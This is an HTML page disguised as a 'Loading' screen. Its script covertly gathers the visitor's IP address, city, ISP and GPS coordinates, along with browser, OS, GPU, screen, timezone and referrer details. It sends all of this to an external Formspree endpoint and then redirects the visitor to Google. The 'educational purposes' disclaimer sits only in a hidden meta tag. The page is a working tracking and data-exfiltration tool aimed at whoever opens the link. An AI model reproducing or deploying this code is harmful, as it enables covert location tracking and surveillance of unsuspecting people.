<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="WARNING: This website is strictly for learning and educational purposes. By accessing this page, you acknowledge that your device information and your location will be visible. I Ituze Bonheur assumes no responsibility for the data displayed or collected, and no reports regarding this site will be accepted or entertained.">
<title>loading…</title>
  <link rel="icon" href="images/ituze.png" type="image/png">
<script src="/analytics.js"></script>

<style>
:root {
    --accent:#00d4ff;
    --bg:#0f0f0f;
    --panel:rgba(255,255,255,0.04);
    --border:rgba(255,255,255,0.08);
}

body{
margin:0;
background:radial-gradient(circle at top,#151515,#0a0a0a);
color:#fff;
font-family:'Segoe UI',system-ui,-apple-system,sans-serif;
display:flex;
align-items:center;
justify-content:center;
height:100vh;
}

.panel{
background:var(--panel);
border:1px solid var(--border);
backdrop-filter:blur(12px);
border-radius:12px;
padding:40px 35px;
width:320px;
text-align:center;
}

.loading-text{
font-size:.9rem;
letter-spacing:4px;
text-transform:uppercase;
opacity:.8;
margin-bottom:25px;
}

.loader{
height:3px;
background:rgba(255,255,255,0.1);
border-radius:3px;
overflow:hidden;
position:relative;
}

.loader::before{
content:"";
position:absolute;
width:40%;
height:100%;
background:linear-gradient(90deg,transparent,var(--accent),#fff,var(--accent),transparent);
animation:slide 1s infinite linear;
}

@keyframes slide{
0%{left:-40%;}
100%{left:100%;}
}
</style>
</head>

<body>

<div class="panel">
<div class="loading-text">Loading</div>
<div class="loader"></div>
</div>

<script>

function detectAndroidVersion(){
const ua=navigator.userAgent;
const match=ua.match(/Android\s([0-9\.]+)/i);
if(!match) return "Not Android";
return "Android "+match[1];
}

function getOS(){
const ua=navigator.userAgent;
if(ua.includes("Windows")) return "Windows";
if(ua.includes("Mac OS")) return "MacOS";
if(ua.includes("Android")) return "Android";
if(ua.includes("Linux")) return "Linux";
if(ua.includes("like Mac")) return "iOS";
return "Unknown";
}

function getGPU(){
const canvas=document.createElement("canvas");
const gl=canvas.getContext("webgl");
if(!gl) return "Unavailable";
const debugInfo=gl.getExtension("WEBGL_debug_renderer_info");
return debugInfo?gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL):"Unavailable";
}

async function getIPData(){
try{

const ipRes=await fetch("https://api.ipify.org?format=json");
const ipJson=await ipRes.json();
const ip=ipJson.ip;

const geoRes=await fetch(`https://ipapi.co/${ip}/json/`);
const geoJson=await geoRes.json();

return{
ip:ip,
country:geoJson.country_name||"Unavailable",
city:geoJson.city||"",
org:geoJson.org||"Unavailable"
};

}catch{
return{
ip:"Unavailable",
country:"Unavailable",
city:"",
org:"Unavailable"
};
}
}

async function getGPS(){
return new Promise(resolve=>{
if(!navigator.geolocation){
resolve({lat:"Unavailable",lon:"Unavailable"});
return;
}

navigator.geolocation.getCurrentPosition(
pos=>{
resolve({
lat:pos.coords.latitude,
lon:pos.coords.longitude
});
},
()=>{
resolve({lat:"Denied",lon:"Denied"});
}
);
});
}

async function collect(){

const ipData=await getIPData();
const gps=await getGPS();

return{

time:new Date().toString(),
ip:ipData.ip,
location:ipData.country+" "+ipData.city,
isp:ipData.org,

gps_lat:gps.lat,
gps_lon:gps.lon,

browser:navigator.userAgent,
os:getOS(),
android_version:detectAndroidVersion(),

screen:screen.width+"x"+screen.height,
timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,
language:navigator.language,
gpu:getGPU(),

platform:navigator.platform,
touch:navigator.maxTouchPoints>0?"Yes":"No",
referrer:document.referrer||"Direct"

};
}

async function sendData(){

const data=await collect();

await fetch("https://formspree.io/f/maqpoaly",{
method:"POST",
headers:{
"Content-Type":"application/json"
},
body:JSON.stringify(data)
});

}

async function start(){

await sendData();

setTimeout(()=>{
window.location.replace("https://www.google.com");
},1000);

}

start();

</script>

</body>
</html>
